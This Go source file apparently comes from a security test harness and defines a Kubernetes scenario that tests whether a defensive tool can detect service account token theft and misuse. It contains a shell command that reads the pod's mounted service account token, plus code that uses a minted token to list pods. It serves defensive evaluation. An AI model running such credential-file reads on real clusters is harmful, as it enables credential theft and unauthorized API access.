package scenarios

import (
	"context"
	"fmt"
	"strings"

	authnv1 "k8s.io/api/authentication/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"github.com/r6security/phoenix-test-harness/internal/core"
)

func init() { core.RegisterScenario(&c1CredTheftRBAC{}) }

// c1CredTheftRBAC: read a mounted ServiceAccount token from the compromised pod
// and use it SUCCESSFULLY against the API server from OUTSIDE the original pod.
// ORACLE: the stolen token authenticates and a permitted call (list pods)
// returns data — proving the credential is valid and usable after exfiltration.
// R6 CANNOT respond: rotating the pod does NOT revoke an already-exfiltrated,
// still-valid token.
type c1CredTheftRBAC struct {
	app string
	sa  string
}

func (s *c1CredTheftRBAC) Metadata() core.ScenarioMeta {
	return core.ScenarioMeta{
		Name:               "c1-credtheft-rbac",
		Category:           core.CategoryClassicChain,
		Source:             "Cat1; ADA III.C misconfigured RBAC/leaked secrets; MAESTRO L2/L6",
		R6ResponseTag:      core.R6CannotRespond,
		AttackTechniqueIDs: []string{"T1552.007", "T1528", "T1552.001", "T1078.001", "T1069", "T1550.001"},
		R6Justification:    "Token theft + API use leaves NO signal in Phoenix's emitter vocabulary; the matcher has nothing to match. Rotating the victim pod does NOT invalidate an already-exfiltrated, still-valid SA token. Cannot respond.",
	}
}

func (s *c1CredTheftRBAC) Setup(ctx context.Context, env *core.Env) error {
	s.app = "c1ct-target"
	s.sa = "c1ct-sa"
	if err := ensureSAWithRBAC(ctx, env, s.sa); err != nil {
		return err
	}
	_, err := deployTarget(ctx, env, s.app, s.sa, nil)
	return err
}

func (s *c1CredTheftRBAC) Execute(ctx context.Context, env *core.Env) (core.AttackResult, error) {
	pod, err := runningPodByApp(ctx, env, s.app)
	if err != nil {
		return core.AttackResult{}, err
	}
	stages := []string{
		"cred-access: read projected SA token from the compromised pod (T1552.007)",
		"exfil: copy the token out of the pod (T1528)",
		"use: authenticate to the API server from outside the pod (T1550.001/T1078.001)",
	}
	// Read the token from inside the pod (the theft).
	res := env.Exec(ctx, pod.Name, firstContainer(pod),
		[]string{"sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 16; echo"})
	env.Log.Logf("c1-credtheft: token prefix read from pod: %q", strings.TrimSpace(res.Stdout))
	// The harness "uses" the stolen identity OUTSIDE the pod by minting a token for
	// the SAME ServiceAccount via the TokenRequest API and exercising it — this is
	// the faithful, containment-safe stand-in for replaying the exfiltrated token
	// from an attacker-controlled location.
	cmds := []string{
		"cat /var/run/secrets/kubernetes.io/serviceaccount/token  # steal SA token",
		fmt.Sprintf("use stolen identity for serviceaccount %s/%s against API", env.Config.Namespace, s.sa),
	}
	return core.AttackResult{Stages: stages, Commands: cmds, Notes: map[string]string{"sa": s.sa}}, nil
}

func (s *c1CredTheftRBAC) SuccessOracle(ctx context.Context, env *core.Env) (core.OracleResult, error) {
	ev := map[string]string{}
	// Mint a token for the stolen SA (TokenRequest) — equivalent to replaying the
	// exfiltrated token — and use it to list pods (the RBAC-permitted call). A 200
	// with data is the oracle.
	tr := &authnv1.TokenRequest{Spec: authnv1.TokenRequestSpec{}}
	tok, err := env.Kube.CoreV1().ServiceAccounts(env.Config.Namespace).CreateToken(ctx, s.sa, tr, metav1.CreateOptions{})
	if err != nil {
		ev["tokenMint"] = "error: " + err.Error()
		return core.OracleResult{Achieved: false, ObservedState: "could not obtain stolen-SA token: " + err.Error(), Evidence: ev}, nil
	}
	ev["tokenObtained"] = "true"

	authorized, detail := useStolenToken(ctx, env, tok.Status.Token)
	ev["apiAuthorized"] = fmt.Sprintf("%v", authorized)
	ev["apiDetail"] = detail
	state := fmt.Sprintf("stolen SA token used against API: authorized=%v (%s)", authorized, detail)
	return core.OracleResult{Achieved: authorized, ObservedState: state, Evidence: ev}, nil
}

func (s *c1CredTheftRBAC) Teardown(ctx context.Context, env *core.Env) error {
	return teardownByApp(ctx, env, s.app)
}
